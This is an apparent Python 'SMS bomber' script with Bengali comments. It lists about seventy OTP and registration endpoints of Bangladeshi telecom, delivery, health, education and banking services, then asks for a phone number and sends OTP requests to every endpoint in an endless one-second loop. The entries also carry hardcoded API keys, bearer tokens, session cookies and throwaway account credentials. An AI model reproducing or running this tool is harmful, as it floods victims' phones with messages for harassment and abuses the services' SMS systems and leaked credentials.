import sys
import time
import threading
import requests
import json

# সব API লিস্ট
apis = [
    {   
        "name": "DeepToPlay",
        "url": "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web",
        "data": lambda phone: {'number': phone},
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
    },
    {
        "name": "Doctime",
        "url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",
        "data": lambda phone: {
            "data": {
                "flag": "https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png",
                "code": "88",
                "contact_no": phone,
                "country_calling_code": "88"
            }
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Easy",
        "url": "https://core.easy.com.bd/api/v1/registration",
        "data": lambda phone: {
            'social_login_id': '',
            'name': 'Anbu',
            'email': 'anbutools.bd@gmail.com',
            'mobile': phone,
            'password': 'AsdfG1233',
            'password_confirmation': 'AsdfG1233',
            'device_key': 'fc7ff66bed592eb157853ef09653666c'
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Grameenphone",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "data": lambda phone: {"msisdn": phone},
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
    },
    {
        "name": "Jotno",
        "url": "https://gw.jotno.net/auth/login/token",
        "data": lambda phone: {
            "userType": "CONSUMER",
            "username": phone
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Osudpotro",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "data": lambda phone: {
            'mobile': phone,
            'deviceToken': 'web',
            'language': 'en',
            'os': 'web'
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Pathao",
        "url": "https://api.pathao.com/v2/auth/register",
        "data": lambda phone: {
            'country_prefix': '880',
            'national_number': phone,
            'country_id': 1
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Paperfly",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "data": lambda phone: {
            "full_name": "Anbu kakashi",
            "company_name": "Anbu Tools",
            "email_address": "anbutools.bd@gmail.com",
            "phone_number": phone
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Packzy",
        "url": "https://userapp.packzy.com/api/send-otp/1",
        "data": lambda phone: {
            'b_name': '',
            'name': 'Anbu',
            'email': 'anbutools.official@gmail.com',
            'mobile': phone,
            'password': 'AsdfG1233@'
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "airtel",
        "url": "https://api.bd.airtel.com/v1/account/forgot-password/otp",
        "data": lambda phone: {
            'phone_number': phone
        },
        "headers": {
            'Content-Type': 'application/json'
        }
    },

    {
    "name": "arogga",
    "url": "https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.11&os=android&osv=33",
    "data": lambda phone: {
        "mobile": phone,
        "fcmToken": "",
        "referral": ""
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "okhttp/4.9.2"
    },
},

    {
    "name": "myairtel",
    "url": "https://myairtel.robi.com.bd/api/v1/tokens/create_opt",
    "data": lambda phone: {
        "msisdn": phone
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded",
        "platform": "android",
        "appname": "airtel",
        "locale": "bn",
        "appversion": "7005002",
        "deviceid": "8fcf4b3d5d493078",
        "User-Agent": "okhttp/4.12.0"
    },
},

    {
    "name": "bdtickets",
    "url": "https://api.bdtickets.com:20100/v1/auth",
    "data": lambda phone: {
        "createUserCheck": True,
        "phoneNumber": phone,
        "applicationChannel": "WEB_APP"
    },
    "headers":{
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://bdtickets.com",
        "Referer": "https://bdtickets.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    },
},

{
    "name": "singleapp",
    "url": "https://singleapp.robi.com.bd/api/v1/tokens/create_opt",
    "data": lambda phone: {
        "msisdn": phone
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded",
        "platform": "android",
        "appname": "robi",
        "locale": "bn",
        "appversion": "7007003",
        "deviceid": "8fcf4b3d5d493078",
        "User-Agent": "okhttp/4.12.0"
    },
},

{
    "name": "bohubrihi",
    "url": "https://bb-api.bohubrihi.com/public/activity/otp",
    "data": lambda phone: {
        "phone": phone,
        "intent": "login"
    },
    "headers":{
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    },
},

{
    "name": "packzy",
    "url": "https://userapp.packzy.com/api/send-otp/1",
    "data": lambda phone: {
        "b_name": "",
        "name": f"{phone}@gmail.com",
        "email": f"{phone}@gmail.com",
        "mobile": phone,
        "password": "AsdfG1233@",
    },
    "headers":{
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/4.9.2"
    },
},

{
    "name": "ecourier",
    "url": lambda phone: f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}",
    "data": None,
    "headers":{
        "Accept": "*/*",
        "Origin": "https://ecourier.com.bd",
        "Referer": "https://ecourier.com.bd/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    },
},

{
    "name": "gadgetandgear",
    "url": "https://api-v2.gadgetandgear.com/api/v1/auth/customer/send-otp",
    "data": lambda phone: {
        "phone": phone,
        "type": "register"
    },
    "headers":{
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    },
},

{
    "name": "ghoorilearning",
    "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
    "data": lambda phone: {
        "mobile_no": phone
    },
    "headers":{
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://ghoorilearning.com",
        "Referer": "https://ghoorilearning.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    },
},

{
    "name": "gogobangla",
    "url": "https://api.gogobangla.com/api/v1/subject/Session/actMaybeConstructAndWait/4T8WdYK22UKxBzJnEhwh8Q?waitForMs=20000&projection=PublicSession",
    "data": lambda phone: {
        "Action": ["RequestOtp", {"Value_": ["BdMobileNumber", phone]}],
        "Constructor": ["NewFromId", ["SessionId", "75163fe1-b682-42d9-b107-3267121c21f1"]],
        "LifeEvent": ["RequestOtpComplete", False]
    },
    "headers":{
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Cookie": "crisp-client%2Fsession%2Ffb1d5692-40af-4b90-a705-33bd4c3e3d11=session_687fbd1e-3560-4a8f-ad17-a3f59bfdd3ce; P_SessionId=%5B%22SessionId%22%2C%2275163fe1-b682-42d9-b107-3267121c21f1%22%5D~EXP~1796370528",
        "Origin": "https://gogobangla.com",
        "Referer": "https://gogobangla.com/",
        "Sec-CH-UA": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
    },
},

{
    "name": "trucklagbe",
    "url": "https://tethys.trucklagbe.com/tl_gateway/tl_login/120/loginWithPhoneNo",
    "data": lambda phone: {
        "userType": "shipper",
        "phoneNo": phone,
        "deviceId": "8fcf4b3d5d493078"
    },
    "headers":{
        "Authorization": "Bearer ",
        "lat": "23.757528333333333",
        "lng": "90.40115333333333",
        "source": "gps",
        "deviceid": "8fcf4b3d5d493078",
        "ut": "6xqs9j5ktzmxufth9XxunSxKgFmvf0hUceFvwf8/1FFARHku0Z/mO+fpjqFAZLdd",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.12"
    },
},

{
    "name": "pathao",
    "url": "https://api.pathao.com/v2/auth/register",
    "data": lambda phone: {
        "country_prefix": "880",
        "national_number": phone,
        "country_id": 1
    },
    "headers":{
        "Content-Type": "application/json; charset=UTF-8",
        "app-agent": "ride/android/471",
        "android-os": "13",
        "User-Agent": "okhttp/4.12.0"
    },
},

{
    "name": "grameenphone GP",
    "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
    "data": lambda phone: {
        "msisdn": phone
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    },
},

{
    "name": "osudpotro",
    "url": "https://api.osudpotro.com/api/v1/users/send_otp",
    "data": lambda phone: {
        "mobile": phone,
        "deviceToken": "web",
        "language": "en",
        "os": "web",
    },
    "headers":{
        "Content-Type": "application/json;charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    },
},

{
    "name": "dhakagate",
    "url": "https://dhakagate.priyoshopretail.com/UserInformation/RequestOTPV2",
    "data": lambda phone: {
        "DevelopmentType": "Production",
        "TempToken": "11899234978",
        "applicationId": 1,
        "contactNo": phone
    },
    "headers":{
        "Content-Type": "application/json; charset=UTF-8",
        "api_key": "XamaroporaneJahachayTumiTaiOYxcvvbnnygbggf##fgsfdg",
        "User-Agent": "okhttp/4.11.0"
    },
},

{
    "name": "redx",
    "url": "https://api.redx.com.bd/v1/user/request-login-code",
    "data": lambda phone: {
        "countryCode": "BD",
        "callingCode": "+880",
        "phoneNumber": phone,
        "service": "redx"
    },
    "headers":{
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://redx.com.bd",
        "Referer": "https://redx.com.bd/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Cookie": "_ga_ZTN98XM7BX=GS1.1.1733305805.1.0.1733305805.60.0.0; _ga=GA1.1.165916058.1733305805; _ga_DVN5RVT5NY=GS1.1.1733305902.1.0.1733305902.60.0.0"
    },
},

{
    "name": "robi",
    "url": "https://webapi.robi.com.bd/v1/account/register/otp",
    "data": lambda phone: {
        "phone_number": phone
    },
    "headers":{
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczMzMwODA3MSwibmJmIjoxNzMzMzA4MDcxLCJleHAiOjE3MzMzMTE2NzEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.g24C0yk33Y0w5tAQSEbbTpaI48srkeFRdkZyFAfyIfg",
        "Content-Type": "application/json;charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    },
},

{
    "name": "myblapi",
    "url": "https://myblapi.banglalink.net/api/v1/send-otp",
    "data": lambda phone: {
        "phone": phone
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded",
        "platform": "android",
        "app-version": "11.17.0",
        "version-code": "1117000",
        "api-client-pass": "1E6F751EBCD16B4B719E76A34FBA9",
        "customer-type": "non-bl",
        "Accept-Language": "en",
        "User-Agent": "okhttp/5.0.0-alpha.10"
    },
},

{
    "name": "sheba",
    "url": "https://accountkit.sheba.xyz/api/shoot-otp",
    "data": lambda phone: {
        "mobile": "+88" + phone,
        "app_id": "8329815A6D1AE6DD",
        "api_token": "A9LI1HGkXXSVa5MbqhIyuWnSggFryKqCbe3u3UELqGeqBkeiXLgqXveytq8g",
    },
    "headers":{
        "Content-Type": "application/json;charset=UTF-8",
        "Custom-Headers": '{"portal-name":"Customer Web"}',
        "Origin": "https://www.sheba.xyz",
        "Referer": "https://www.sheba.xyz/",
    },
},

{
    "name": "sindabad",
    "url": "https://offers.sindabad.com/api/mobile-otp",
    "data": lambda phone: {
        "key": "af5456594e5def5b8d11e344eb96cd30",
        "mobile": "+88" + phone
    },
    "headers":{
        "Content-Type": "application/json",
        "Authorization": "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgd2luZG93cyBudCAxMDAgd2luNjQgeDY0IGFwcGxld2Via2l0NTM3MzYga2h0bWwgbGlrZSBnZWNrbyBjaHJvbWUxMzEwMDAgc2FmYXJpNTM3MzZiYW5kb3JhZjU0NTY1OTRlNWRlZjViOGQxMWUzNDRlYjk2Y2QzMA==",
        "Origin": "https://sindabad.com",
        "Referer": "https://sindabad.com/",
    },
},

{
    "name": "sundarbancourierltd",
    "url": "https://api-gateway.sundarbancourierltd.com/graphql",
    "data": lambda phone: {
        "operationName": "CreateAccessToken",
        "variables": {
            "accessTokenFilter": {
                "userName": phone
            }
        },
        "query": """
            mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
            createAccessToken(accessTokenFilter: $accessTokenFilter) {
                message
                statusCode
                result {
                phone
                otpCounter
                __typename
                }
                __typename
            }
            }
        """
    },
    "headers":{
        "Content-Type": "application/json",
        "Origin": "https://customer.sundarbancourierltd.com",
    },
},

{
    "name": "obhai",
    "url": "https://api.obhai.com/app_start_phone_check",
    "data": lambda phone: {
        "phone_no": "+88" + phone,
        "count": "0"
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded",
        "lang": "en",
        "User-Agent": "okhttp/5.0.0-alpha.2"
    },
},

{
    "name": "shikho",
    "url": "https://api.shikho.com/auth/v2/send/sms",
    "data": lambda phone: {
        "phone": phone,
        "type": "student",
        "auth_type": "signup",
        "vendor": "shikho"
    },
    "headers":{
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://shikho.com",
        "Referer": "https://shikho.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    },
},

{
    "name": "shwapno",
    "url": "https://www.shwapno.com/api/auth",
    "data": lambda phone: {
        "phoneNumber": phone
    },
    "headers":{
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Origin": "https://www.shwapno.com",
        "Referer": "https://www.shwapno.com/eggs",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    },
},

{
    "name": "swap",
    "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
    "data": lambda phone: {
        "phone": phone
    },
    "headers":{
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Host": "api.swap.com.bd",
        "Origin": "https://swap.com.bd",
        "Referer": "https://swap.com.bd/"
    },
},

{
    "name": "viewlift",
    "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-a120c896-b6b4-4350-e9eb-abfc4165a9cb",
    "data": lambda phone: {
        "phoneNumber": "+88" + phone,
        "requestType": "send",
        "whatsappConsent": True
    },
    "headers":{
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.hoichoi.tv",
        "Referer": "https://www.hoichoi.tv/",
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
    },
},

{
    "name": "chorki",
    "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
    "data": lambda phone: {
        "number": "+88" + phone
    },
    "headers":{
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.chorki.com",
        "Referer": "https://www.chorki.com/"
    },
},

{
    "name": "karobarapp",
    "url": "https://backend.karobarapp.com/auth/phone-login/",
    "data": lambda phone: {
        "phone_number": phone,
        "os": "Android",
        "country": "bangladesh"
    },
    "headers":{
        "Content-Type": "application/json",
        "Accept": "application/json"
    },
},

{
    "name": "bikroy",
    "url": lambda phone: f"https://api.bikroy.com/v1/verifications/phone_login?phone={phone}",
    "data": None,
    "headers":{
        "Content-Type": "application/json",
        "User-Agent": "Bikroy 1.5.54/371 (Android 13/33; samsung/SM-F7110; 720x1452/299; Grameenphone) Release",
        "Accept-Language": "bn_BD"
    },
},

{
    "name": "doctime",
    "url": lambda phone: f"https://api.doctime.com.bd/api/hashing/status?country_calling_code=88&contact={phone}",
    "data":  {
        None,
    },
    "headers":{
        "Accept": "application/json",
        "User-Agent": "okhttp/4.9.3"
    },
},

{
    "name": "jslglobal",
    "url": "https://user-api.jslglobal.co:444/v2/send-otp",
    "data": lambda phone: {
        "phone": "+88" + phone,
        "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "User-Agent": "okhttp/4.12.0"
    },
},

{
    "name": "bongobd",
    "url": "https://accounts.bongobd.com/realms/bongo/login-actions/authenticate?session_code=ml1uQetPdHeaJd_598a465uZ4mpqmhxa13PH6CZK-bw&execution=a8d40102-6986-4bd9-a122-99b1ea13f670&client_id=otplogin&tab_id=03LBF-8TWGo&client_data=eyJydSI6ImJvbmdvYXBwOi8vYWNjb3VudHMuYm9uZ29iZC5jb20vYXV0aC9yZWRpcmVjdGlvbi9zdWNjZXNzIiwicnQiOiJjb2RlIiwicm0iOiJxdWVyeSIsInN0IjoiNjRlMjM4OTktYjZkOS00OTRkLTlhMzktOTc1ZmQ2MWVlYzVjIn0",
    "data": lambda phone: {
        "country": "+880",
        "phoneNumberPart": phone,
        "phone_number": "+88" + phone
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-F7110 Build/TP1A.220624.014;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.107 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    },
},

{
    "name": "aibl",
    "url": "https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp",
    "data": lambda phone: {
        "countryId": "19",
        "mobileNumber": phone,
        "purpose": "registration"
    },
    "headers":{
        "Content-Type": "application/json; charset=utf-8",
        "Authorization": "Otp bnVsbA==",
        "User-Agent": "Dart/2.10 (dart:io)"
    },
},

{
    "name": "tallykhata",
    "url": "https://web.tallykhata.com/api/auth/init",
    "data": lambda phone: {
        "app_version_number": 189,
        "bp_code": "",
        "device_id": "77ef3c98-1006-4343-8026-38eac1000204",
        "mobile": phone,
        "request_type": "LOGIN"
    },
    "headers":{
        "Authorization": "Basic c3luY191c2VyOlQhQjdZI0E5Jm48Y3M3QGM=",
        "api-version": "1.0",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "okhttp/4.9.2"
    },
},

{
    "name": "hishabee",
    "url": "https://app.hishabee.business/api/V2/forget-password/otp/send",
    "data": lambda phone: {
        "mobile_number": phone
    },
    "headers":{
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "okhttp/4.11.0"
    },
},

{
    "name": "apex4u",
    "url": "https://api.apex4u.com/api/auth/login",
    "data": lambda phone: {
        "phoneNumber": phone
    },
    "headers":{
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    },
},

{
    "name": "rootsedulive",
    "url": "https://rootsedulive.com/api/auth/register",
    "data": lambda phone: {
        'name': 'Pagli Khatun',
        'phone': '88' + phone,
        'email': f'subap{phone}agli2023@gmail.com',
        'password': 'iDSnWh6rzp9KNAY',
        'confirmPassword': 'iDSnWh6rzp9KNAY',
    },
    "headers":{
        "Content-Type": "application/x-www-form-urlencoded"
    },
},

{
    "name": "goldkinen",
    "url": "https://api.goldkinen.com/api/v2/auth/request-otp/",
    "data": lambda phone: {
        "phone_number": phone,
        "scope": "registration",
        "is_resend": False
    },
    "headers":{
        "Content-Type": "application/json",
        "User-Agent": "gk-app"
    },
},

{
    "name": "apex4u",
    "url": "https://api.apex4u.com/api/auth/login",
    "data": lambda phone: {
        "phoneNumber": phone
    },
    "headers":{
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    },
},



{
    "name": "fundesh",
    "url": "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
    "data": lambda phone: {
        "msisdn": phone
    },
    "headers":{
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    },
},

{
    "name": "chinaonlineapi",
    "url": lambda phone: f"https://chinaonlineapi.com/api/v1/get/otp?phone={phone}",
    "data":  {
        None,
    },
    "headers":{
        "token": "gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219",
        "Origin": "https://chinaonlinebd.com",
        "Referer": "https://chinaonlinebd.com/"
    },
},

{
    "name": "chokrojan",
    "url": "https://chokrojan.com/api/v1/passenger/login/mobile",
    "data": lambda phone: {
        "mobile_number": phone
    },
    "headers":{
        "domain-name": "chokrojan.com",
        "user-platform": "3",
        "company-id": "1",
        "Origin": "https://chokrojan.com",
        "Referer": "https://chokrojan.com/login",
        "Content-Type": "application/json"
    },
},

{
    "name": "mygp 2",
    "url": lambda phone: f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/",
    "data": {
        None,
    },
    "headers":{
        "Content-Type": "application/json"
    },
},

{
    "name": "deeptoplay",
    "url": "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web",
    "data": lambda phone: {
        "number": phone
    },
    "headers":{
        "Content-Type": "application/json",
    },
},

{
    "name": "easy",
    "url": "https://core.easy.com.bd/api/v1/registration",
    "data": lambda phone: {
        "name": "Shahidul Islam",
        "email": "uyrlhkgxqw@emergentvillage.org",
        "mobile": phone,
        "password": "boss#2022",
        "password_confirmation": "boss#2022",
        "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"
    },
    "headers":{
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Referer": "https://easy.com.bd/",
        "Content-Type": "application/json",
    },
},

{
    "name": "englishmojabd",
    "url": "https://api.englishmojabd.com/api/v1/auth/login",
    "data": lambda phone: {
        "phone": f"+88{phone}"
    },

},

{
    "name": "moveon",
    "url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp",
    "data": lambda phone: {
        "phone": phone
    },
    "headers":{
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Origin": "https://moveon.com.bd",
        "Referer": "https://moveon.com.bd/auth/register"
    },
},

{
    "name": "paperfly",
    "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
    "data": lambda phone: {
        "full_name": "Hangama",
        "company_name": "Hangama",
        "email_address": "hangama@gmail.com",
        "phone_number": phone
    },
    "headers":{
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
    },
},

{
    "name": "qcoom",
    "url": "https://auth.qcoom.com/api/v1/otp/send",
    "data": lambda phone: {
        "mobileNumber": "+88" + phone
    },
    "headers":{
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Referer": "https://qcoom.com/",
        "Content-Type": "application/json"
    },
},

{
    "name": "bkshopthc",
    "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
    "data": lambda phone: {
        "phone": phone,
        "email": "",
        "language": "en"
    },
    "headers":{
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36'
    },
},

{
    "name": "weblogin",
    "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
    "data": lambda phone: {
        "msisdn": phone
    },
    "headers":{
        'Content-Type': 'application/json'
    },
},

{
    "name": "hishabexpress",
    "url": "https://api.hishabexpress.com/login/status",
    "data": lambda phone: {
        "msisdn": phone,
        "hash": "Anbu Kakashi",
    },
    "headers":{
        "user-agent": "Dart/2.19 (dart:io)",
        "Content-Type": "application/x-www-form-urlencoded",
    },
},

{
    "name": "bdkepler",
    "url": "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp",
    "data": lambda phone: {
        "deviceId": "7dtdhid45c0f0901",
        "deviceInfo": {
            "deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA",
            "deviceId": "7d8b0agi0g0f0901",
            "firebaseDeviceToken": "",
            "manufacturer": "MI",
            "modelName": "NOTE 10",
            "osFirmWireBuild": "",
            "osName": "Android",
            "osVersion": "10",
            "rootDevice": 0
    },
    "operator": "Gp",
    "walletNumber": phone
    },
    "headers":{
        "Content-Type": "application/json",
    },
},

{
    "name": "toybox",
    "url": "https://api.toybox.live/bdapps_handler.php",
    "data": lambda phone: {
        "Operation": "CreateSubscription",
        "MobileNumber": "88" + phone,
        "PackageID": 100,
        "Secret": "HJKX71%UHYH"
    },
    "headers":{
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
    },
},

{
    "name": "win2gain",
    "url": lambda phone: f"https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{phone}",
    "data":  {
        None,
    },
    "headers":{
        "sourcePlatform": "web",
        "client": "2",
    },
},

{
    "name": "developer",
    "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp?",
    "data": lambda phone: {
        "country_code": "+880",
        "phone": phone,
    },
    "headers":{
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Content-Type": "application/json",
    },
},


{
    "name": "quiztime",
    "url": "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp",
    "data": lambda phone: {
        "country_code": "+88",
        "phone": phone
    },

},

{
    "name": "robi2",
    "url": "https://da-api.robi.com.bd/da-nll/otp/send",
    "data": lambda phone: {
        "msisdn": phone
    },
    "headers":{
        "Content-Type": "application/json"
    },
},

{
    "name": "sheba",
    "url": "https://accountkit.sheba.xyz/api/shoot-otp",
    "data": lambda phone: {
        "mobile": phone,
        "app_id": "8329815A6D1AE6DD",
        "api_token": "fpByoxVpv1c5tzjJBTiq71ShvqBcgWo0hVmbY3MfoE1mx3K0cqi1IZWsbNDa"
    },
    "headers":{
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Origin": "https://www.sheba.xyz",
        "Referer": "https://www.sheba.xyz/",
        "Custom-Headers": json.dumps({"portal-name": "Customer Web"})
    },
},

{
    "name": "shikho",
    "url": "https://api.shikho.com/auth/v2/send/sms",
    "data": lambda phone: {
        "phone": phone,
        "type": "student",
        "auth_type": "signup",
        "vendor": "shikho"
    },
    "headers":{
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Origin": "https://shikho.com",
        "Referer": "https://shikho.com/"
    },
},

]
    
def typing_effect(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)  # টাইমিং সেট করুন (0.05 সেকেন্ড ডিলে)

# API কল করার ফাংশন
def make_api_call(phone, api):
    try:

        # API কল
        response = requests.post(
            api["url"],
            headers=api["headers"],
            data=json.dumps(api["data"](phone)),
        )

        if response.status_code == 200:
            print(f"{api['name']} API Phone Number Called Successfully: {phone}")

            print(f"{response.text}\n")
        else:
            print(f"{api['name']} API Has Failed: {response.status_code}\n")
    except Exception as e:
        print(f"{api['name']} API Error During Call: {str(e)}\n")

# প্রতিটি API কল করার ফাংশন
def call_all_apis(phone):
    while True:
        for api in apis:
            make_api_call(phone, api)
        time.sleep(1)  # প্রতি ১ সেকেন্ড পর API লুপ হবে

# থ্রেড ব্যবহার করে কল শুরু
def start_calling(phone):
    thread = threading.Thread(target=call_all_apis, args=(phone,))
    thread.daemon = True
    thread.start()

typing_effect("\nEnter Number:>> ")
phone = input()

# কল শুরু
start_calling(phone)

# প্রোগ্রাম চালু রাখা
while True:
    time.sleep(1)
